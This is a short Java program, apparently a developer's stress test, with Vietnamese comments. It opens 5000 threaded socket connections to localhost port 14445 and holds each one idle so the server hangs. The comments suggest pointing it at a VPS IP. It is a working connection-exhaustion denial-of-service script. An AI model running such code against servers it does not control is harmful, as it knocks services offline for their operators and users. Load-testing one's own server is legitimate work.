/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package testddos;
import java.net.Socket;

public class DdosTester {
    public static void main(String[] args) {
        System.out.println("Bắt đầu spam kết nối tới Server...");
        for (int i = 0; i < 5000; i++) { // Bắn 5000 kết nối cùng lúc
            new Thread(() -> {
                try {
                    // Đổi IP thành IP VPS hoặc localhost, Port 14445
                    Socket socket = new Socket("127.0.0.1", 14445);
                    // Không gửi data gì cả, giữ kết nối để làm treo Server
                    Thread.sleep(100000); 
                } catch (Exception e) {
                    // Kết nối bị từ chối
                }
            }).start();
        }
    }
}